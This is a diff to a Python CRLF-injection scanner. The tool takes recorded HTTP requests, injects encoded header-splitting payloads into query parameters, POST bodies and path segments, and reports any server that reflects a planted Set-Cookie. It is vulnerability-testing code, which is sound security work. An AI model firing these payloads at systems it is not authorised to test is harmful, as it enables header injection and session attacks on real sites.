@@ -3,11 +3,13 @@ import logging
 import asyncio
 import httpx
 import re
-from urllib.parse import urlparse, urljoin, urlencode, parse_qs
+from urllib.parse import urlparse, urljoin, parse_qs
 from tabulate import tabulate
 from colorama import init, Fore
+import signal
+import sys
 
-# Initialize colorama for colored output
+# Initialize colorama
 init(autoreset=True)
 
 # Configuration
@@ -30,277 +32,203 @@ CRLF_PAYLOADS = [
     '%3f%0dSet-Cookie:crlf=injection',
     '%u000aSet-Cookie:crlf=injection'
 ]
-DEFAULT_TIMEOUT = 50
+DEFAULT_TIMEOUT = 10
+SEMAPHORE_LIMIT = 5
 
-# Concurrency limit for async tasks
-SEMAPHORE_LIMIT = 5  # You can adjust this value based on your system's capacity
+last_results = []
 
-async def inject_crlf_payload(session, request, semaphore):
-    """
-    Inject crlfpayloads into the request and test for vulnerabilities, including path-based crlf.
-    
-    Args:
-        session: The HTTPX session.
-        request: A dictionary containing request details from requests.json.
-        semaphore: A semaphore for limiting concurrent requests.
-    
-    Returns:
-        List of dictionaries containing results for each tested payload.
-    """
+
+def clean_headers(headers):
+    """Remove Content-Length and Transfer-Encoding headers (case-insensitive)."""
+    if not headers:
+        return {}
+    return {k: v for k, v in headers.items()
+            if k.lower() not in ("content-length", "transfer-encoding")}
+
+
+async def inject_CRLF_payload(session, request, semaphore):
     results = []
     url = request["url"]
     method = request.get("method", "GET").upper()
-    headers = request.get("headers", {}).copy()
+    headers_in = request.get("headers", {}) or {}
     body = request.get("body")
     parsed_url = urlparse(url)
     query_params = parse_qs(parsed_url.query)
 
-    # Semaphore to limit concurrency
     async with semaphore:
-        # Test GET requests with query parameters
+        # 1. GET parameter injection
         if method == "GET" and query_params:
             for param, values in query_params.items():
                 for payload in CRLF_PAYLOADS:
                     modified_params = query_params.copy()
-                    modified_params[param] = [payload for value in values]
+                    modified_params[param] = [payload for _ in values]
                     new_query_string = "&".join(
-                        f"{param}={value}" for param, values in modified_params.items() for value in values
+                        f"{p}={v}" for p, vals in modified_params.items() for v in vals
                     )
-                    new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")
+                    new_url = parsed_url._replace(query=new_query_string).geturl()
 
-                    result = await test_crlf(session, new_url, method, headers=headers)
-                    if result and result["crlf_detected"]:
-                        result["query_params"] = query_params  # Original query parameters
-                        result["modified_query_params"] = modified_params  # Modified query parameters
-                        result["payload"] = payload  # The payload used
+                    result = await test_CRLF(session, new_url, method, headers=headers_in.copy())
+                    if result and result["CRLF_detected"]:
+                        result["query_params"] = query_params
+                        result["modified_query_params"] = modified_params
+                        result["payload"] = payload
                         results.append(result)
-                        break  # Break after detecting crlfand move to the next request
+                        break
 
-        # Test POST requests with payloads
-        elif method == "POST" and body:
+        # 2. POST body injection
+        elif method == "POST" and body is not None:
             for payload in CRLF_PAYLOADS:
+                data_to_send = None
+                json_to_send = None
                 if isinstance(body, str):
-                    modified_body = body + payload
-                    logging.debug(f"Modified body size (str): {len(modified_body)}")
-                    headers.pop("Content-Length", None)
-                    headers.pop("Transfer-Encoding", None)
+                    data_to_send = body + payload
                 elif isinstance(body, dict):
-                    modified_body = {key: payload for key, value in body.items()}
-                    body_str = json.dumps(modified_body)
-                    logging.debug(f"Modified body size (dict): {len(body_str)}")
-                    headers.pop("Content-Length", None)
-                    headers["Transfer-Encoding"] = "chunked"
+                    json_to_send = {k: (payload if not isinstance(v, str) else v + payload)
+                                    for k, v in body.items()}
                 else:
-                    modified_body = body
+                    data_to_send = str(body) + payload
 
-                # Log body size before sending request
-                logging.debug(f"Sending request with body size: {len(modified_body)}")
-
-                # Send the request with the modified body
                 try:
-                    result = await test_crlf(session, url, method, headers=headers, data=modified_body)
-                    if result and result["crlf_detected"]:
-                        result["post_data"] = body  # Original POST data
-                        result["modified_post_data"] = modified_body  # Modified POST data with payload
-                        result["payload"] = payload  # The payload used
+                    result = await test_CRLF(session, url, method, headers=headers_in.copy(),
+                                             data=data_to_send, json_data=json_to_send)
+                    if result and result["CRLF_detected"]:
+                        result["post_data"] = body
+                        result["modified_post_data"] = json_to_send if json_to_send else data_to_send
+                        result["payload"] = payload
                         results.append(result)
-                        break  # Break after detecting crlfand move to the next request
+                        break
                 except Exception as e:
-                    logging.error(f"Error while testing crlfpayload: {e}")
+                    logging.error(f"Error while testing CRLF payload: {e}")
                     continue
 
-        # Path-Based crlfDetection (only modify path)
-        if method == "GET" or method == "POST":
-            path_parts = parsed_url.path.split('/')
-
-            # Look for path segments that could be vulnerable
+        # 3. Path-based injection
+        if method in ("GET", "POST"):
+            path_parts = parsed_url.path.strip("/").split("/") if parsed_url.path.strip("/") else []
             for i, part in enumerate(path_parts):
-                if part:  # Only modify non-empty path segments
+                if part:
                     for payload in CRLF_PAYLOADS:
-                        path_parts[i] = payload
-                        modified_path = '/'.join(path_parts[:i] + [payload])
-                        new_url = urlparse(url)._replace(path=modified_path).geturl()
+                        modified_parts = path_parts.copy()
+                        modified_parts[i] = payload
+                        modified_path = "/" + "/".join(modified_parts)
+                        new_url = parsed_url._replace(path=modified_path).geturl()
 
-                        # Send the request with the modified path
                         try:
-                            result = await test_crlf(session, new_url, method, headers=headers)
-                            if result and result["crlf_detected"]:
-                                result["path"] = parsed_url.path  # Original path
-                                result["modified_path"] = modified_path  # Modified path with payload
-                                result["payload"] = payload  # The payload used
+                            result = await test_CRLF(session, new_url, method, headers=headers_in.copy())
+                            if result and result["CRLF_detected"]:
+                                result["path"] = parsed_url.path
+                                result["modified_path"] = modified_path
+                                result["payload"] = payload
                                 results.append(result)
-                                break  # Break after detecting crlfand move to the next request
+                                break
                         except Exception as e:
-                            logging.error(f"Error while testing path-based crlfpayload: {e}")
-                        path_parts[i] = part  # Reset path segment after testing
-
+                            logging.error(f"Error while testing path-based CRLF payload: {e}")
     return results
 
-async def test_crlf(session, url, method, headers=None, data=None):
-    """
-    Send an HTTP request and test for crlfvulnerabilities.
-    
-    Args:
-        session: The HTTPX session.
-        url: The request URL.
-        method: The HTTP method.
-        headers: Optional headers for the request.
-        data: Optional data for POST requests.
-    
-    Returns:
-        A dictionary with the test results or None if no crlfis detected.
-    """
-    try:
-        response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)
 
-        for payload in CRLF_PAYLOADS:
-            if re.search(r'(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlf=injection)(?:\s*?)(?:$|;)', response.text):  # Check for CRLF payload in the header
+async def test_CRLF(session, url, method, headers=None, data=None, json_data=None):
+    """Send request with cleaned headers and detect CRLF injection via Set-Cookie reflection."""
+    try:
+        cleaned_headers = clean_headers(headers or {})
+
+        if logging.getLogger().isEnabledFor(logging.DEBUG):
+            logging.debug(f"Request: {method} {url}")
+            logging.debug(f"Headers before clean: {list(headers.keys()) if headers else []}")
+            logging.debug(f"Headers after clean: {list(cleaned_headers.keys())}")
+
+        response = await session.request(method, url, headers=cleaned_headers,
+                                         data=data, json=json_data, timeout=DEFAULT_TIMEOUT)
+
+        if "Set-Cookie" in response.headers:
+            set_cookie_header = response.headers["Set-Cookie"]
+            set_cookie_pattern = r'(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlf=injection)(?:\s*?)(?:$|;)'
+            if re.search(set_cookie_pattern, set_cookie_header):
                 return {
                     "url": url,
                     "method": method,
                     "status_code": response.status_code,
-                    "crlf_detected": True,
-                    "payload": payload
+                    "CRLF_detected": True,
+                    "payload": set_cookie_header,
+                    "detected_in": "header"
                 }
-        return {
-            "url": url,
-            "method": method,
-            "status_code": response.status_code,
-            "crlf_detected": False
-        }
+
+        return {"url": url, "method": method,
+                "status_code": response.status_code, "CRLF_detected": False}
+
     except httpx.RequestError as e:
-        logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
-        return {
-            "url": url,
-            "method": method,
-            "status_code": "Error",
-            "crlf_detected": False,
-            "error": str(e)
-        }
+        logging.error(f"Error testing {url}: {e}")
+        return {"url": url, "method": method,
+                "status_code": "Error", "CRLF_detected": False, "error": str(e)}
     except Exception as e:
         logging.error(f"Unexpected error testing {url}: {e}")
-        return {
-            "url": url,
-            "method": method,
-            "status_code": "Error",
-            "crlf_detected": False,
-            "error": str(e)
-        }
+        return {"url": url, "method": method,
+                "status_code": "Error", "CRLF_detected": False, "error": str(e)}
+
 
 async def process_requests(requests):
-    """
-    Process all requests from requests.json and check for crlfvulnerabilities.
-    
-    Args:
-        requests: A list of request dictionaries.
-    
-    Returns:
-        A list of results from the crlftests.
-    """
-    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
+    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
     async with httpx.AsyncClient() as session:
-        tasks = [inject_crlf_payload(session, request, semaphore) for request in requests]
+        tasks = [inject_CRLF_payload(session, request, semaphore) for request in requests]
         results = await asyncio.gather(*tasks)
-        return [item for sublist in results for item in sublist]  # Flatten the results
+        return [item for sublist in results for item in sublist]
+
 
 def load_requests(file_path):
-    """
-    Load requests from requests.json.
-    
-    Args:
-        file_path: Path to the JSON file containing request details.
-    
-    Returns:
-        A list of request dictionaries.
-    """
     with open(file_path, 'r') as f:
         return json.load(f)
 
+
 def save_results(results, output_file):
-    """
-    Save results to a JSON file.
-    
-    Args:
-        results: List of results from the crlftests.
-        output_file: Path to the output file.
-    """
     with open(output_file, 'w') as f:
         json.dump(results, f, indent=4)
 
+
 def save_output_on_exit(sig, frame):
-    """Function to save output gracefully when interrupted."""
-    logging.info("Saving output before exit...")
-    with open("output.json", "w") as f:
-        json.dump(requests_data, f, indent=4)
-    logging.info("Output saved. Exiting...")
+    global last_results
+    logging.info("Interrupted — saving last results to output_on_interrupt.json ...")
+    try:
+        with open("output_on_interrupt.json", "w") as f:
+            json.dump(last_results, f, indent=4)
+        logging.info("Saved output_on_interrupt.json")
+    except Exception as e:
+        logging.error(f"Failed to save output: {e}")
     sys.exit(0)
 
+
 def print_results(results):
-    """
-    Print results in a formatted table.
-    
-    Args:
-        results: List of results from the crlftests.
-    """
-    # Filter results to only show detected crlfvulnerabilities
-    crlf_results = [result for result in results if result["crlf_detected"]]
-
+    crlf_results = [r for r in results if r["CRLF_detected"]]
     if not crlf_results:
-        print(Fore.YELLOW + "No crlf vulnerabilities detected.")
+        print(Fore.YELLOW + "No CRLF vulnerabilities detected.")
         return
-
-    table_data = []
-    for result in crlf_results:
-        table_data.append([
-            result["url"],
-            result["method"],
-            result["status_code"],
-            Fore.RED + "crlf Detected"
-        ])
-    headers = ["URL", "Method", "Status Code", "crlfDetection"]
+    table_data = [[r["url"], r["method"], r["status_code"], Fore.RED + "CRLF Detected"]
+                  for r in crlf_results]
+    headers = ["URL", "Method", "Status Code", "CRLF Detection"]
     print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))
 
+
 async def main(input_file, output_file):
-    """
-    Main function to orchestrate the crlfdetection process.
-    
-    Args:
-        input_file: Path to the input JSON file.
-        output_file: Path to the output JSON file.
-    """
+    global last_results
     requests = load_requests(input_file)
     logging.info(f"Loaded {len(requests)} requests for testing.")
-
     results = await process_requests(requests)
-    # Filter results to only include crlfdetections
-    crlf_results = [result for result in results if result["crlf_detected"]]
+    last_results = [r for r in results if r["CRLF_detected"]]
+    print_results(last_results)
+    save_results(last_results, output_file)
 
-    print_results(crlf_results)
-    save_results(crlf_results, output_file)
-    signal.signal(signal.SIGINT, save_output_on_exit)
 
 if __name__ == "__main__":
     import argparse
-    import sys
-    import signal
 
-    # Define a signal handler to save results on interrupt
-    signal.signal(signal.SIGINT, save_output_on_exit)
-
-    # Command-line argument parsing
-    parser = argparse.ArgumentParser(description="crlfDetection Tool")
-    parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
-    parser.add_argument("--output", default="results_crlf_linux.json", help="Output file for results (default: results_crlf_linux.json)")
+    parser = argparse.ArgumentParser(description="CRLF Detection Tool")
+    parser.add_argument("--input", default="requests.json", help="Input file with requests")
+    parser.add_argument("--output", default="results_CRLF.json", help="Output file for results")
     parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     args = parser.parse_args()
 
-    # Logging configuration
-    logging.basicConfig(
-        level=logging.DEBUG if args.verbose else logging.INFO,
-        format="%(asctime)s [%(levelname)s] %(message)s",
-    )
+    signal.signal(signal.SIGINT, save_output_on_exit)
 
-    # Run the main function in the asyncio event loop
+    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO,
+                        format="%(asctime)s [%(levelname)s] %(message)s")
+
     try:
         asyncio.run(main(args.input, args.output))
     except KeyboardInterrupt:
